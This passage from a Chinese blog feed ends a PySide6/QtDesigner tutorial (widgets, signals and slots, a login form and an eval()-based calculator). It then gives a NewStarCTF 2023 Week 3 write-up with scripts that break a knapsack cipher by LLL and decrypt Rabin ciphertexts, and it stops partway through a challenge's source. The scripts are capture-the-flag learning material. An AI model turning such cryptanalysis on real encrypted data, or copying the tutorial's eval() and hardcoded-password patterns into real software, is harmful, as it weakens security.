class="table-container"><table><thead><tr><th style="text-align:center">属性</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center">text</td><td style="text-align:center">标签上显示的文字</td></tr><tr><td style="text-align:center">textFormat</td><td style="text-align:center">如PlainText、MarkdownText和RichText形式</td></tr><tr><td style="text-align:center">alignment</td><td style="text-align:center">文本对齐方式</td></tr><tr><td style="text-align:center">pixmap</td><td style="text-align:center">显示图片</td></tr></tbody></table></div><h3 id="QLineEdit"><a href="#QLineEdit" class="headerlink" title="QLineEdit"></a>QLineEdit</h3><p>该控件需要从<code>PySide6.QtWidgets</code>导入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PySide6.QtWidgets <span class="keyword">import</span> QLineEdit</span><br><span class="line"><span class="built_in">input</span> = QLineEdit(<span class="string">&quot;框中预留文字&quot;</span>, self)</span><br></pre></td></tr></table></figure><p>下面是一些常用的输入框特有属性</p><div class="table-container"><table><thead><tr><th style="text-align:center">属性</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center">maxLength</td><td style="text-align:center">最大输入长度</td></tr><tr><td style="text-align:center">readOnly</td><td style="text-align:center">是否设置为只读模式</td></tr><tr><td style="text-align:center">placeholderText</td><td style="text-align:center">框中无任何输入时显示的文字</td></tr><tr><td style="text-align:center">pixmap</td><td style="text-align:center">显示图片</td></tr></tbody></table></div><h2 id="初识QtDesigner"><a href="#初识QtDesigner" class="headerlink" title="初识QtDesigner"></a>初识QtDesigner</h2><h3 id="制作一个简单页面"><a href="#制作一个简单页面" class="headerlink" title="制作一个简单页面"></a>制作一个简单页面</h3><h4 id="登录框"><a href="#登录框" class="headerlink" title="登录框"></a>登录框</h4><p>首先我们需要考虑页面中会出现哪些种控件</p><p>一般来说登录页面会需要输入账号密码，所以会需要输入框</p><p>而提示以及提交则需要标签和按钮控件</p><p>将这些元素拖拽入窗口中，并进行初步的属性设置，我们就能得到一个简易的窗口模板</p><img src="/posts/ebc439ef19b2/image-20231114171033608.png" class="" title="image-20231114171033608"><p>此时按<code>Ctrl</code>+<code>R</code>或者点击<strong>窗体&gt;预览</strong>，我们就能预览当前窗口的效果</p><img src="/posts/ebc439ef19b2/image-20231114171207323.png" class="" title="image-20231114171207323"><img src="/posts/ebc439ef19b2/image-20231114171225123.png" class="" title="image-20231114171225123"><p>我们会发现窗口的标题还是默认的，我们可以直接去设置窗体本身的属性</p><img src="/posts/ebc439ef19b2/image-20231114171516115.png" class="" title="image-20231114171516115"><p>当设计完毕后，我们可以将设计文件保存为<code>.ui</code>后缀的文件</p><img src="/posts/ebc439ef19b2/image-20231114171629175.png" class="" title="image-20231114171629175"><h4 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h4><p>同样我们也能拖拉出一个计算器的UI，这些过程能让我们逐渐熟悉QtDesigner的操作</p><img src="/posts/ebc439ef19b2/image-20231114173114951.png" class="" title="image-20231114173114951"><h3 id="编译UI文件"><a href="#编译UI文件" class="headerlink" title="编译UI文件"></a>编译UI文件</h3><p>在QtDesigner中设计好了界面UI后，只能对其进行预览</p><p>如果想在程序中运行并显示我们设计的UI，则需要进一步将其<strong>编译为python源码</strong>，即py文件</p><p>我们可以之间执行如下指令（在安装pyside6的python环境下）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyside6-uic xxx.ui -o xxx.py</span><br></pre></td></tr></table></figure><p>或者在vscode中，我们可以利用插件PYQT Integration的功能</p><p>右键ui文件，选择<strong>PYQT:Compile Form</strong>即可</p><img src="/posts/ebc439ef19b2/image-20231114215247088.png" class="" title="image-20231114215247088"><h3 id="使用编译得到的py文件"><a href="#使用编译得到的py文件" class="headerlink" title="使用编译得到的py文件"></a>使用编译得到的py文件</h3><p>上一步中，我们通过编译<code>login.ui</code>文件得到了<code>UI_login.py</code>的py源码</p><p>窗口文件在一个叫Ui_Form的类中</p><img src="/posts/ebc439ef19b2/image-20231114215847387.png" class="" title="image-20231114215847387"><p>有<strong>两种方法</strong>在其他的程序中<strong>调用这个生成的窗口UI</strong></p><ol><li><p>在需要调用的地方创建一个该对象的实例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Ui_login <span class="keyword">import</span> Ui_Form</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyWindow</span>(<span class="title class_ inherited__">QWidget</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.login = Ui_Form()</span><br><span class="line">        self.login.setupUi(self)</span><br></pre></td></tr></table></figure><p>setupUi为我们生成的UI的类中的函数，参数需要将我们当前的窗体传进去，这里我们直接传self</p><div class="note warning flat"><p>需要注意的是我们的MyWindow继承的<strong>窗口类型需要与UI文件的一致</strong></p></div></li><li><p>第二种方法则是利用python多继承的特性，即我们的窗口可以继承多个类</p><p>将Ui_Form也作为我们窗口的父类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Ui_login <span class="keyword">import</span> Ui_Form</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyWindow</span>(QWidget,Ui_Form):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.setupUi(self)</span><br></pre></td></tr></table></figure></li></ol><h2 id="信号与槽"><a href="#信号与槽" class="headerlink" title="信号与槽"></a>信号与槽</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>PYQT界面的交互需要依靠<strong>信号与槽</strong>，类似于其他图形界面编程中的事件响应</p><p>事件响应机制的图形界面会不断地update，来检测页面中是否有什么元素发生了变化</p><p>而信号与槽的机制中，只有界面元素发出信号给相应的槽，页面才会进行修改</p><p><strong>信号 (Signals)</strong></p><ul><li><strong>定义</strong>：信号是PySide6（和Qt）中的一个关键概念，是从对象发送的消息，表明发生了某种事件或状态变化。</li><li><strong>特点</strong>：信号不包含处理逻辑，它们只负责通知事件的发生。</li></ul><p><strong>槽 (Slots)</strong></p><ul><li><strong>定义</strong>：槽是用来接收信号的方法。当与信号相连的特定事件发生时，相应的槽函数会被调用。</li><li><strong>特点</strong>：槽可以是任何可调用的Python函数或方法。</li></ul><h3 id="信号与槽-vs-事件触发响应"><a href="#信号与槽-vs-事件触发响应" class="headerlink" title="信号与槽 vs 事件触发响应"></a>信号与槽 vs 事件触发响应</h3><p><strong>事件触发响应</strong></p><ul><li><strong>机制</strong>：基于事件循环，当用户进行操作（如点击、键入）时，事件被生成并放入事件队列，然后由应用程序逐个处理。</li><li><strong>应用</strong>：通常用于处理用户输入、窗口变化等。</li><li><strong>优点</strong>：<ul><li><strong>直观性</strong>：事件处理通常更直观，易于理解。</li><li><strong>控制性</strong>：可以在事件处理中有更多控制，如事件过滤。</li></ul></li><li><strong>缺点</strong>：<ul><li><strong>紧耦合</strong>：事件处理函数通常与特定控件或场景紧密相关。</li><li><strong>处理复杂性</strong>：对于复杂的交互，事件处理可能变得复杂和冗长。</li></ul></li></ul><p><strong>信号与槽</strong></p><ul><li><strong>机制</strong>：基于信号的发送和槽的接收，更侧重于对象间的通信。</li><li><strong>应用</strong>：适合于不同组件间的通信，例如，一个组件的行为触发另一个组件的反应。</li><li><strong>优点</strong>：<ul><li><strong>解耦</strong>：发信者和接收者不需要知道彼此的存在。</li><li><strong>灵活性</strong>：可以连接多个槽到一个信号，或将一个槽连接到多个信号。</li></ul></li></ul><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PySide6.QtWidgets <span class="keyword">import</span> QApplication, QPushButton</span><br><span class="line"></span><br><span class="line">app = QApplication([])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个按钮</span></span><br><span class="line">button = QPushButton(<span class="string">&quot;Click me&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义槽函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_button_clicked</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Button clicked!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将按钮的clicked信号连接到槽函数</span></span><br><span class="line">button.clicked.connect(on_button_clicked)</span><br><span class="line"></span><br><span class="line">button.show()</span><br><span class="line">app.<span class="built_in">exec</span>()</span><br></pre></td></tr></table></figure><p>在这个例子中，当按钮被点击时，<code>clicked</code>信号被发出，然后<code>on_button_clicked</code>槽函数被调用。</p><p>我们通过<code>.connect</code>将信号与槽连接起来</p><h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><h4 id="完善登录框"><a href="#完善登录框" class="headerlink" title="完善登录框"></a>完善登录框</h4><p>为了了解我们之前设计的UI中各控件的对象名，我们可以回到QtDesigner中查看</p><img src="/posts/ebc439ef19b2/image-20231115002012831.png" class="" title="image-20231115002012831"><p>例如第一个输入框，它被自动命名为<code>lineEdit</code>，那么我们在代码中就能通过<code>self.lineEdit</code>调用它</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PySide6.QtWidgets <span class="keyword">import</span> QApplication, QWidget, QLineEdit</span><br><span class="line"><span class="keyword">from</span> Ui_login <span class="keyword">import</span> Ui_Form</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyWindow</span>(QWidget,Ui_Form):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line"></span><br><span class="line">        self.setupUi(self)</span><br><span class="line">        self.pushButton.clicked.connect(self.loginFuc)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">loginFuc</span>(<span class="params">self</span>):</span><br><span class="line">        username = self.lineEdit.text()</span><br><span class="line">        password = self.lineEdit_2.text()</span><br><span class="line">        <span class="keyword">if</span> username ==<span class="string">&quot;admin&quot;</span> <span class="keyword">and</span> password ==<span class="string">&quot;123456&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;登录成功&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;登录失败&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app =QApplication()</span><br><span class="line">    window = MyWindow()</span><br><span class="line">    window.show()</span><br><span class="line">    app.<span class="built_in">exec</span>()</span><br></pre></td></tr></table></figure><p>在代码中，我们让之前的UI界面有了响应，即用户名和密码输对时会在控制台输出”登录成功”，否则输出”登陆失败“</p><h4 id="完善计算器"><a href="#完善计算器" class="headerlink" title="完善计算器"></a>完善计算器</h4><p>我们来对之前的计算器界面重新布局一下</p><p>布局的好处是缩放界面时，控件的位置与大小也能自动的做出相应调整</p><img src="/posts/ebc439ef19b2/image-20231115002722927.png" class="" title="image-20231115002722927"><p>对每一行按钮水平布局后，我们再对整体进行垂直布局</p><img src="/posts/ebc439ef19b2/image-20231115002816883.png" class="" title="image-20231115002816883"><p>此时的控件还没有与窗口的位置形成相对关系，无法对页面缩放做出响应</p><img src="/posts/ebc439ef19b2/image-20231115002938415.png" class="" title="image-20231115002938415"><p>我们将页面整体改为垂直布局，并适当调整最上方输入框的高度</p><img src="/posts/ebc439ef19b2/image-20231115004218732.png" class="" title="image-20231115004218732"><p>此时我们就能得到一个较为整齐的计算器界面</p><p>为了后续在代码中更清晰地编写信号与槽的逻辑，我们需要<strong>对页面控件重新命名</strong></p><img src="/posts/ebc439ef19b2/image-20231115004208675.png" class="" title="image-20231115004208675"><p>例如<code>.</code>按钮，我们将其命名为<code>pushButton_dot</code></p><p>那么计算器的逻辑中我们没有必要绑定太多槽</p><p>一个思路是先利用其他按钮的信号<strong>生成算式的字符串</strong>，每次调用槽的时候刷新输入框的显示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">addNumber</span>(<span class="params">self,number</span>):</span><br><span class="line">    self.lineEdit.clear()</span><br><span class="line">    self.expression+=number</span><br><span class="line">    self.lineEdit.setText(<span class="built_in">str</span>(self.expression))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在代码中，我们<strong>新建一个<code>bind()</code>函数来记录绑定关系</strong>，然后在初始化函数中一并调用<code>bind</code>即可</p><p>这样能保证初始化函数的简洁性</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">bind</span>(<span class="params">self</span>):</span><br><span class="line">    self.pushButton_0.clicked.connect(<span class="keyword">lambda</span>:self.addNumber(<span class="string">&#x27;0&#x27;</span>))</span><br><span class="line">    self.pushButton_1.clicked.connect(<span class="keyword">lambda</span>:self.addNumber(<span class="string">&#x27;1&#x27;</span>))  </span><br><span class="line">    self.pushButton_2.clicked.connect(<span class="keyword">lambda</span>:self.addNumber(<span class="string">&#x27;2&#x27;</span>))</span><br><span class="line">    self.pushButton_3.clicked.connect(<span class="keyword">lambda</span>:self.addNumber(<span class="string">&#x27;3&#x27;</span>))</span><br><span class="line">    self.pushButton_4.clicked.connect(<span class="keyword">lambda</span>:self.addNumber(<span class="string">&#x27;4&#x27;</span>))</span><br><span class="line">    self.pushButton_5.clicked.connect(<span class="keyword">lambda</span>:self.addNumber(<span class="string">&#x27;5&#x27;</span>))      </span><br><span class="line">    self.pushButton_6.clicked.connect(<span class="keyword">lambda</span>:self.addNumber(<span class="string">&#x27;6&#x27;</span>))</span><br><span class="line">    self.pushButton_7.clicked.connect(<span class="keyword">lambda</span>:self.addNumber(<span class="string">&#x27;7&#x27;</span>))</span><br><span class="line">    self.pushButton_8.clicked.connect(<span class="keyword">lambda</span>:self.addNumber(<span class="string">&#x27;8&#x27;</span>))</span><br><span class="line">    self.pushButton_9.clicked.connect(<span class="keyword">lambda</span>:self.addNumber(<span class="string">&#x27;9&#x27;</span>))</span><br><span class="line">    self.pushButton_add.clicked.connect(<span class="keyword">lambda</span>:self.addNumber(<span class="string">&#x27;+&#x27;</span>))</span><br><span class="line">    self.pushButton_sub.clicked.connect(<span class="keyword">lambda</span>:self.addNumber(<span class="string">&#x27;-&#x27;</span>))</span><br><span class="line">    self.pushButton_mul.clicked.connect(<span class="keyword">lambda</span>:self.addNumber(<span class="string">&#x27;*&#x27;</span>))</span><br><span class="line">    self.pushButton_div.clicked.connect(<span class="keyword">lambda</span>:self.addNumber(<span class="string">&#x27;/&#x27;</span>))</span><br><span class="line">    self.pushButton_dot.clicked.connect(<span class="keyword">lambda</span>:self.addNumber(<span class="string">&#x27;.&#x27;</span>))</span><br><span class="line">    self.pushButton_enter.clicked.connect(self.count)</span><br></pre></td></tr></table></figure><div class="note info flat"><p>在 Python 编程语言中，<code>lambda</code> 关键字用于创建匿名函数，这种函数称为 lambda 函数。Lambda 函数可以接受任何数量的参数，但只能有一个表达式。它们通常用于需要函数对象的地方，但又不想在代码中定义完整的函数。Lambda 函数的基本语法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">lambda</span> arguments: expression</span><br></pre></td></tr></table></figure></div><p>在绑定信号时如果我们直接写成：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.pushButton_0.clicked.connect(self.addNumber(<span class="string">&#x27;0&#x27;</span>))</span><br></pre></td></tr></table></figure><p>这样当python解释器读到这一行代码时会立即执行 <code>self.addNumber(&#39;0&#39;)</code> ，这并不是我们想要的。我们希望的是，每次按钮被点击时，才调用 <code>self.addNumber(&#39;0&#39;)</code>。我们<strong>需要传递一个函数对象给connect</strong></p><p>为了解决这个问题，我们使用 <code>lambda</code> 创建了一个匿名函数，这个匿名函数没有参数，并在被调用时执行 <code>self.addNumber(&#39;0&#39;)</code>。这样，每次按钮被点击时，实际上是调用这个匿名函数，然后这个匿名函数再去调用 <code>self.addNumber(&#39;0&#39;)</code></p><div class="note primary flat"><p>使用 <code>lambda</code> 这种方式使得我们可以在不创建额外的命名函数的情况下，传递带有参数的方法作为信号的槽函数。</p></div><p>当最后当点击计算按钮时，<strong>借助python中的eval()函数</strong>，我们能将生成的字符串变为算式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">count</span>(<span class="params">self</span>):</span><br><span class="line">    self.result = <span class="built_in">eval</span>(self.expression)</span><br><span class="line">    self.lineEdit.setText(<span class="built_in">str</span>(self.result))</span><br><span class="line">    self.expression = <span class="built_in">str</span>(self.result)</span><br></pre></td></tr></table></figure><p>当然我们也可以为计算器加上清空和回退的功能</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">self.pushButton_clear.clicked.connect(self.clear)</span><br><span class="line">self.pushButton_back.clicked.connect(self.back)</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear</span>(<span class="params">self</span>):</span><br><span class="line">    self.lineEdit.clear()</span><br><span class="line">    self.expression = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">back</span>(<span class="params">self</span>):</span><br><span class="line">    self.lineEdit.clear()</span><br><span class="line">    self.expression = self.expression[:-<span class="number">1</span>]</span><br><span class="line">    self.lineEdit.setText(<span class="built_in">str</span>(self.expression))</span><br></pre></td></tr></table></figure><p>最终的效果如下</p><img src="/posts/ebc439ef19b2/2023-11-15-11-14-47.gif" class="" title="2023-11-15-11-14-47">]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> note </tag>
            
            <tag> GUI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NewStarCTF2023 Week3题解</title>
      <link href="/posts/04d1547e2896/"/>
      <url>/posts/04d1547e2896/</url>
      
        <content type="html"><![CDATA[<h1 id="WEEK3"><a href="#WEEK3" class="headerlink" title="WEEK3"></a>WEEK3</h1><p>NewStarCTF2023，或者应该叫OldBirdCTF🤣本文为第三周部分题目的题解，可能与官方wp有出入，请见谅。</p><p>这周逐渐感受到什么叫大三被project包围</p><p>只能抽空做个几题</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="knapsack"><a href="#knapsack" class="headerlink" title="knapsack"></a>knapsack</h3><p>最基础的Merkle–Hellman背包加密</p><p>直接上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sagemath</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="comment"># open the public key and strip the spaces so we have a decent array</span></span><br><span class="line">fileKey = <span class="built_in">open</span>(<span class="string">&quot;pubkey.txt&quot;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">pubKey = fileKey.read().decode().replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip(<span class="string">&#x27;[]&#x27;</span>).split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">nbit = <span class="built_in">len</span>(pubKey)</span><br><span class="line"><span class="comment"># open the encoded message</span></span><br><span class="line">fileEnc = <span class="built_in">open</span>(<span class="string">&quot;enc.txt&quot;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">encoded = fileEnc.read().decode().replace(<span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;start&quot;</span>)</span><br><span class="line"><span class="comment"># create a large matrix of 0&#x27;s (dimensions are public key length +1)</span></span><br><span class="line">A = Matrix(ZZ, nbit + <span class="number">1</span>, nbit + <span class="number">1</span>)</span><br><span class="line"><span class="comment"># fill in the identity matrix</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbit):</span><br><span class="line">    A[i, i] = <span class="number">1</span></span><br><span class="line"><span class="comment"># replace the bottom row with your public key</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbit):</span><br><span class="line">    A[i, nbit] = pubKey[i]</span><br><span class="line"><span class="comment"># last element is the encoded message</span></span><br><span class="line">A[nbit, nbit] = -<span class="built_in">int</span>(encoded)</span><br><span class="line"></span><br><span class="line">res = A.LLL()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, nbit + <span class="number">1</span>):</span><br><span class="line">    <span class="comment"># print solution</span></span><br><span class="line">    M = res.row(i).<span class="built_in">list</span>()</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> M:</span><br><span class="line">        <span class="keyword">if</span> m != <span class="number">0</span> <span class="keyword">and</span> m != <span class="number">1</span>:</span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(i, M)</span><br><span class="line">        M = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">str</span>(j) <span class="keyword">for</span> j <span class="keyword">in</span> M)</span><br><span class="line">        <span class="comment"># remove the last bit</span></span><br><span class="line">        M = M[:-<span class="number">1</span>]</span><br><span class="line">        M = <span class="built_in">hex</span>(<span class="built_in">int</span>(M, <span class="number">2</span>))[<span class="number">2</span>:-<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(M)</span><br></pre></td></tr></table></figure><p>得到flag</p><h3 id="Rabin’s-RSA"><a href="#Rabin’s-RSA" class="headerlink" title="Rabin’s RSA"></a>Rabin’s RSA</h3><p>在线网站大数分解得到p、q</p><p>使用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rabin_decrypt</span>(<span class="params">c, p, q, e=<span class="number">2</span></span>):</span><br><span class="line">    n = p * q</span><br><span class="line">    mp = <span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line">    mq = <span class="built_in">pow</span>(c, (q + <span class="number">1</span>) // <span class="number">4</span>, q)</span><br><span class="line">    yp = gmpy2.invert(p, q)</span><br><span class="line">    yq = gmpy2.invert(q, p)</span><br><span class="line">    r = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">    rr = n - r</span><br><span class="line">    s = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">    ss = n - s</span><br><span class="line">    <span class="keyword">return</span> (r, rr, s, ss)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = <span class="number">20442989381348880630046435751193745753</span></span><br><span class="line">p = <span class="number">13934102561950901579</span></span><br><span class="line">q =<span class="number">14450452739004884887</span></span><br><span class="line">m = rabin_decrypt(c, p, q)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m[i])[<span class="number">2</span>:]))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>得到flag</p><img src="/posts/04d1547e2896/image-20231008212049788.png" class="" title="image-20231008212049788"><h3 id="Door"><a href="#Door" class="headerlink" title="Door"></a>Door</h3><p>源码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">key = urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[+] WatchDog Security System</span></span><br><span class="line"><span class="string">[+] Copyright (c) 1010 by School of Natural Philosophy </span></span><br><span 